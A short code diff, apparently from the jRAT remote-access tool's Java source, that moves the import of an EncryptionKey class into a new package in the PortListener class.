@@ -6,9 +6,9 @@ import java.util.ArrayList;
 import java.util.List;
 
 import pro.jrat.Slave;
+import pro.jrat.common.crypto.EncryptionKey;
 import pro.jrat.ui.panels.PanelMainSockets;
 
-import com.redpois0n.common.crypto.EncryptionKey;
 
 public class PortListener implements Runnable {
 
